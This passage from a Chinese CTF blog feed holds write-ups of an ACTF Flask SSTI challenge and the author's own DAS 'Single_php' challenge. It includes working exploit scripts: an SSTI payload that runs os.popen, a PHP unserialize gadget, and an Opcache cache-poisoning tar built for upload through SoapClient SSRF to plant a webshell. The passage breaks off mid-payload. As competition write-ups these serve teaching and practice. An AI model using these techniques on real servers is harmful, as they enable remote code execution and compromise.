class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>规则比较独特，六个规则随机生成三个，其实只需满足一条就行，同样是凹概率.</p><p>这种 ssti 随便打，拿个密钥先.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url1 =<span class="string">&quot;http://127.0.0.1:15000/&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&quot;story&quot;</span></span><br><span class="line">:</span><br><span class="line"><span class="string">&quot;&#123;&#123;config&#125;&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>:<span class="string">&quot;eyJ2aXAiOnRydWV9.ZUHlMg.eUH9ICmOx6JUujFsb8MxYu4QkOE&quot;</span>&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = requests.post(url=url1+<span class="string">&quot;write&quot;</span>,json=data,cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        cookie = res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>].split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(cookie)</span><br><span class="line">        res2 = requests.get(url=url1+<span class="string">&quot;story&quot;</span>,cookies = &#123;<span class="string">&quot;session&quot;</span>:cookie&#125;)</span><br><span class="line">        <span class="built_in">print</span>(res2.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这种爆破对👴来说还是太简单了，随随便便写个脚本冲了</p><p>拿到密钥能干很多事了，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;6e409b39-94e4-4557-9549-961bafdebf98&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/story&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">session_get</span>():</span><br><span class="line">    session[<span class="string">&#x27;story&#x27;</span>] = <span class="string">&quot;&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> session[<span class="string">&#x27;story&#x27;</span>] </span><br></pre></td></tr></table></figure><p>👴不想跑 flasksession 脚本，太懒了，费劲，😡,👴就直接在路由里面设置了.</p><p><img src="/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101135012.png" alt="微信截图_20231101135012"></p><p>eeeeeeeeez!</p><p>其它简单的题，👴不想动了.</p><p>终于🐛完了，好📕👚啊</p><p>これが君の知らない物語</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="WP" scheme="https://1llustrious.github.io/tags/WP/"/>
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
    <category term="复现" scheme="https://1llustrious.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>关于DAS的小记</title>
    <link href="https://1llustrious.github.io/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/"/>
    <id>https://1llustrious.github.io/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/</id>
    <published>2023-12-01T01:10:33.000Z</published>
    <updated>2023-12-02T11:42:32.727Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">写在前面</a></li><li><a href="#single_php">Single_php</a><ul><li><a href="#opcache">Opcache</a></li><li><a href="#soapclient">SoapClient</a></li></ul></li><li><a href="#ezfastjson">Ezfastjson</a><ul><li><a href="#nomap">Nomap</a><ul><li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE">参考文献😊</a></li><li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE">调用链</a></li><li><a href="#writeobject">writeObject</a></li></ul></li><li><a href="#%E5%86%85%E5%AD%98%E9%A9%AC">内存马</a></li></ul></li><li><a href="#kali_tips">kali_tips</a></li></ul><!-- tocstop --><h1 id="写在前面"><span id="写在前面"> 写在前面</span></h1><p>这次 DAS 是我们 0psu3 成员出的题，这也是我第一次出题给各位师傅做，有出得不好的地方还希望师傅们轻点喷😭😭😭.</p><p>我出的是 <code>Single_php</code> , 一开始只是想出一个 Opcache 扩展漏洞的，通过文件上传到 /tmp 目录下覆盖的，后来在思考，怎么给师傅们 phpinfo, 于是我就想起了可以通过数组的形式调用任意无参方法，于是我又改了一下，打算配套整个 SSRF, 众所周知，调用 SoapClient 不存在的方法，就可以打 SSRF, 通过 UA 进行报文伪造，而且又涉及到文件上传，压缩包的数据在报文里面一般都是乱码，伪造起来比较麻烦，于是我通过 python 发包，获取 body, 于是就有了这道题的打法.</p><p>另外本文中，我还会整一个 Ezfastjson 的内容，分享一些微不足道的小知识，还请师傅们手下留情.</p><h1 id="single_php"><span id="single_php"> Single_php</span></h1><p>这道题的最终结果意想不到，我预计难度中等，想着几个简单的知识点凑一块可能会被打烂，但完全出乎意料.</p><p>该题目叫 Single_php 完全是我夹带私货，多少有点个人恩怨了😅</p><p>?LuckyE=highlight_file 获得源码</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/e4f1299e-3114-454f-933d-4d56d4e168ae.png" alt="e4f1299e-3114-454f-933d-4d56d4e168ae"></p><p>企业，我的企业斯哈斯哈🥵🥵🥵🥵</p><p>但是，我已经单身 19 年了，而身边的人都已经脱单了～～，我要复仇！！！(bushi)~~ 尤其是某 S 开头的师傅.</p><p>这就能看到源码了，是不是很简单😊😊😊</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$koi</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;koi[<span class="string">&#x27;zhanjiangdiyishenqing&#x27;</span>]();</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$kanozyo</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;LuckyE&#x27;</span>](<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="title function_ invoke__">var_dump</span>(<span class="variable">$kanozyo</span>);</span><br><span class="line"> <span class="variable">$suki</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;suki&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>你看，源码就这么点内容.</p><p>已经能对当前文件进行操作，不过为了防止师傅们乱搞，防止一些奇奇怪怪非预期，我将当前目录设置为只读了🤣, 真不是我懒.</p><p>信息搜集提示还有个文件 siranai.php (希腊奶哟)</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/image-20231201140448843.png" alt="image-20231201140448843"></p><p>这可是通过 SSRF 触发文件上传涅🥰🥰</p><p>软链接？似乎不行，目录穿越？也不行，都说了当前目录只读，能操控的只有 /tmp 目录了.</p><p>不过有个 phpinfo, 还是要继续信息搜集</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$koi</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">siroha</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;koi = [<span class="string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/image-20231201140622508.png" alt="image-20231201140622508"></p><p>哦，有个扩展，这个扩展是有漏洞的.</p><h2 id="opcache"><span id="opcache"> Opcache</span></h2><p>具体来说，就是在 /tmp 某一特定目录下，放了缓存文件，访问 index.php 的时候，会加载这个缓存文件，从而展示页面.</p><p>但是，如果缓存文件被篡改，就会变成其它 php 代码，而我们要做的就是通过 tar 文件上传，覆盖掉原本的缓存文件，从而写入一句话.</p><p>完成这个利用，需要几个要素:</p><p>index.php 的最后的时间戳</p><p>当前 php 的 systemid.</p><p>这个 systemid 的计算脚本简化如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_id = hashlib.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\002&quot;</span>.<span class="title function_ invoke__">encode</span>(<span class="string">&quot;utf-8&quot;</span>)).<span class="title function_ invoke__">hexdigest</span>()</span><br></pre></td></tr></table></figure><p>根据 php 版本改变.</p><p>系统会根据缓存文件的时间戳，判定其有效性，如果时间戳不对，就会删掉缓存文件并重新生成一份，于是我们就需要伪造.</p><p>那怎么获取时间戳呢， <code>$_GET['LuckyE'](__FILE__)</code>  除了获取源码之外，还能够获取时间戳.</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/image-20231201141652093.png" alt="image-20231201141652093"></p><p>本地起个相同 php 版本的 docker, 安装扩展.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-php-ext-configure opcache --enable-opcache &amp;&amp; docker-php-ext-install opcache</span><br></pre></td></tr></table></figure><p>获取的时间戳，转为十六进制，然后两位两位的倒这放进去</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/image-20231201141320451.png" alt="image-20231201141320451"></p><p>也可以写个脚本修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import tarfile</span><br><span class="line">import subprocess</span><br><span class="line">import os</span><br><span class="line">url = <span class="string">&quot;http://43.143.192.19:1145/?LuckyE=filectime&quot;</span></span><br><span class="line">def <span class="title function_ invoke__">timec</span>():</span><br><span class="line">    pattern = r<span class="string">&quot;\d&#123;10&#125;&quot;</span></span><br><span class="line">    timeres = requests.<span class="title function_ invoke__">get</span>(url=url)</span><br><span class="line">    <span class="keyword">match</span> = re.<span class="title function_ invoke__">search</span>(r<span class="string">&#x27;int\((\d&#123;10&#125;)\)&#x27;</span>, timeres.text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查是否有匹配</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 提取匹配到的数字</span></span><br><span class="line">        ten_digit_number = <span class="keyword">match</span>.<span class="title function_ invoke__">group</span>(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">print</span>(ten_digit_number)</span><br><span class="line">        <span class="keyword">return</span>  ten_digit_number</span><br><span class="line">    except:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;dame&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">split_string_into_pairs</span>(input_string):</span><br><span class="line">    <span class="comment"># 检查输入字符串的长度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(input_string) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        raise <span class="title function_ invoke__">ValueError</span>(<span class="string">&quot;输入字符串的长度必须是偶数。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用切片操作将字符串分割成两位一组的子字符串</span></span><br><span class="line">    pairs = [input_string[i:i+<span class="number">2</span>] <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="title function_ invoke__">len</span>(input_string), <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> pairs</span><br><span class="line">def <span class="title function_ invoke__">totime</span>(time):</span><br><span class="line">    b = <span class="title function_ invoke__">split_string_into_pairs</span>(f<span class="string">&quot;&#123;hex(int(time))&#125;&quot;</span>)</span><br><span class="line">    b.<span class="title function_ invoke__">pop</span>(<span class="number">0</span>)</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="title function_ invoke__">len</span>(b)):</span><br><span class="line">        s += b[-<span class="number">1</span>]</span><br><span class="line">        b.<span class="title function_ invoke__">pop</span>(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">changetime</span>():</span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&quot;index.php.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        binary_data = file.<span class="title function_ invoke__">read</span>()</span><br><span class="line">        <span class="comment"># 将二进制数据转换为十六进制字符串</span></span><br><span class="line">        hex_data = binascii.<span class="title function_ invoke__">hexlify</span>(binary_data).<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        new_data = hex_data[<span class="number">0</span>:<span class="number">128</span>]+<span class="title function_ invoke__">totime</span>(<span class="title function_ invoke__">timec</span>())+hex_data[<span class="number">136</span>:]</span><br><span class="line">        with <span class="title function_ invoke__">open</span>(<span class="string">&quot;index.php.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.<span class="title function_ invoke__">write</span>(bytes.<span class="title function_ invoke__">fromhex</span>(new_data))</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">changetime</span>()</span><br></pre></td></tr></table></figure><p>修改完时间戳后，就可以打包 tar 了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">tar_file</span>():</span><br><span class="line">    tar_filename = <span class="string">&#x27;exp.tar&#x27;</span></span><br><span class="line">    with tarfile.<span class="title function_ invoke__">open</span>(tar_filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">        directory_info = tarfile.<span class="title function_ invoke__">TarInfo</span>(name=f<span class="string">&#x27;&#123;sys_id&#125;/var/www/html&#x27;</span>)</span><br><span class="line">        directory_info.type = tarfile.DIRTYPE</span><br><span class="line">        directory_info.mode = <span class="number">0o777</span></span><br><span class="line"></span><br><span class="line">        tar.<span class="title function_ invoke__">addfile</span>(directory_info)</span><br><span class="line"></span><br><span class="line">        tar.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;index.php.bin&#x27;</span>, arcname=f<span class="string">&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里为了方便，还是写了个脚本。设置 777 权限也是为了在 /tmp 目录下写进去.</p><p>最后就是触发 SSRF 了，由于涉及到 SoapClient 的 UA 注入，而且 tar 包有二进制数据，处理起来比较麻烦.</p><p>这里我就直接通过 python 获取了，很方便，👴真 tmd 是个天才！！！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">tar_file</span>():</span><br><span class="line">    tar_filename = <span class="string">&#x27;exp.tar&#x27;</span></span><br><span class="line">    with tarfile.<span class="title function_ invoke__">open</span>(tar_filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">        directory_info = tarfile.<span class="title function_ invoke__">TarInfo</span>(name=f<span class="string">&#x27;&#123;sys_id&#125;/var/www/html&#x27;</span>)</span><br><span class="line">        directory_info.type = tarfile.DIRTYPE</span><br><span class="line">        directory_info.mode = <span class="number">0o777</span></span><br><span class="line"></span><br><span class="line">        tar.<span class="title function_ invoke__">addfile</span>(directory_info)</span><br><span class="line"></span><br><span class="line">        tar.<span class="title function_ invoke__">add</span>(<span class="string">&#x27;index.php.bin&#x27;</span>, arcname=f<span class="string">&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">tar_file</span>()</span><br><span class="line">def <span class="title function_ invoke__">upload</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;exp.tar&quot;</span>,<span class="title function_ invoke__">open</span>(<span class="string">&quot;exp.tar&quot;</span>,<span class="string">&quot;rb&quot;</span>).<span class="title function_ invoke__">read</span>(),<span class="string">&quot;application/x-tar&quot;</span>)&#125;</span><br><span class="line">    res  = requests.<span class="title function_ invoke__">post</span>(url=url,files=file)</span><br><span class="line">    <span class="keyword">print</span>(res.request.headers)</span><br><span class="line">    <span class="keyword">return</span> res.request</span><br><span class="line">request_content = <span class="title function_ invoke__">upload</span>()</span><br><span class="line">upload_body = <span class="title function_ invoke__">str</span>(request_content.body).<span class="title function_ invoke__">replace</span>(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)</span><br><span class="line">content_length = request_content.headers[<span class="string">&#x27;Content-Length&#x27;</span>]</span><br><span class="line"><span class="keyword">print</span>(content_length)</span><br><span class="line"><span class="keyword">print</span>(upload_body)</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/image-20231201141920429.png" alt="image-20231201141920429"></p><h2 id="soapclient"><span id="soapclient"> SoapClient</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$koi</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$postdata</span> = <span class="string">&quot;--0f9486e921f5468f9ab50745c4c93267\r\nContent-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;exp.tar\&quot;\r\nContent-Type: application/x-tar\r\n\r\n214510e772fba140ea7a33a277f2799e/var/www/html/\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000777\x000000000\x000000000\x0000000000000\x0000000000000\x00014543\x00 5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00././@PaxHeader\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000000000\x000000000\x000000000\x0000000000034\x0000000000000\x00010212\x00 x\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ustar\x0000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0028 mtime=1696745575.7742124\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\